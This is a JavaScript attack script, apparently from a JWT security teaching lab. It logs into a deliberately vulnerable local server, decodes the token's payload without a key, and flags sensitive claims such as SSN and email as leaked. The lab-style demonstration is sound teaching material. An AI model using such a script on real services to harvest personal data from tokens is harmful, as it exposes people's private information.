/*
 * ATTACK 06 — payload exposure (JWT is encoded, not encrypted)
 * -------------------------------------------------------------
 * Root cause: a JWT payload is only base64url-encoded, NOT encrypted. Anyone
 * who sees a token can read every claim. The vulnerable server stuffs PII
 * (email, ssn) and role into the payload, leaking it to anyone holding the
 * token. No forgery needed — just decode.
 *
 * Run:  node attacks/06-payload-exposure.js
 *       TARGET=http://localhost:5000 node attacks/06-payload-exposure.js
 */
const { post, banner, show, verdict, decodeJwt } = require('./_lib');

const SENSITIVE = ['ssn', 'email', 'password', 'creditCard', 'dob'];

(async () => {
  banner('ATTACK 06 — payload exposure (base64 decode, no key needed)');

  const login = await post('/login', { username: 'alice', password: 'password1' });
  const token = login.body.token || login.body.access_token;
  if (!token) { show('Login failed', login); return; }
  show('Captured token', token);

  const { header, payload } = decodeJwt(token);
  show('Base64-decoded HEADER (no secret used)', header);
  show('Base64-decoded PAYLOAD (no secret used)', payload);

  const leaked = Object.keys(payload).filter((k) => SENSITIVE.includes(k));
  show('Sensitive claims exposed', leaked.length ? leaked : 'none');

  const ok = leaked.length > 0;
  verdict(ok, ok ? `PII leaked in plaintext payload: ${leaked.join(', ')}.`
               : 'no sensitive data in payload — nothing leaked.');
})();
